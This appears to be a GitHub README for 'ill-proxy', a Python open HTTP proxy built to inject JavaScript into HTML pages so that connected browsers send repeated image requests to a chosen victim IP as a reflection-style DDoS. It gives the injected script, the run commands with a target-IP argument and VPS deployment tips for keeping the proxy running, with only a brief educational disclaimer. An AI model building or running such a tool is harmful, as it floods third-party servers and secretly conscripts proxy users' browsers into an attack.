# 🧠 Reflection DDoS via Open HTTP Proxy

**ill-proxy** is a Python-based open HTTP proxy that injects JavaScript into HTML responses. The injected script forces connected browsers to generate multiple outbound requests to a target server, simulating a reflection-based DDoS attack where unsuspecting clients become amplifiers.


---

## 🔧 Features

- Open HTTP proxy on port 8080
- Injects JavaScript payload into HTML responses
- Payload creates multiple image requests to a target IP
- Victim IP can be passed via command line
- Optional request logging to a specified file
- Lightweight — no dependencies beyond the Python standard library
- Ideal for research, educational labs, red team simulations, or pentesting your own systems


---

## ⚙️ How It Works

1. Clients connect through the proxy.
2. The proxy forwards HTTP traffic.
3. If the response is HTML (`Content-Type: text/html`), it injects a `<script>` that loads 100 images from the victim server.
4. Each connected client unknowingly reflects traffic to the target.


---

### 💥 Example Payload
```
<script>
  for (let i = 0; i < 100; i++) {
    let img = new Image();
    img.src = "http://198.51.100.77/img" + i + ".jpg";
  }
</script>
```
Replace `198.51.100.77` with your controlled test server IP.


---

## 🚀 Setup

1. Clone the repo:
```
git clone https://github.com/ill-deed/ill-proxy.git cd ill-proxy
```
2. Run the proxy:
```
python3 ill-proxy.py
```
3. Optional: specify a target victim IP and log file:
```
python3 ill-proxy.py http://1.2.3.4 attack.log
```
4. Configure a browser to use your VPS as an HTTP proxy (port 8080).

5. Visit any HTTP website (not HTTPS) to trigger injection.


---

## 📓 Deployment Notes

- Use `tmux`, `screen`, `nohup`, or a `systemd` service to keep the proxy running in the background.
- Make sure port 8080 is open in both UFW and your cloud provider’s firewall panel.
- Logging is optional and only occurs if a file path is passed as the second argument.

---

## ⚠️ Disclaimer

This tool is provided strictly for **educational, testing, and research purposes**. Do **not** use it on unauthorized systems or networks. Misuse of this tool may violate laws and ethical guidelines. You are fully responsible for your actions.
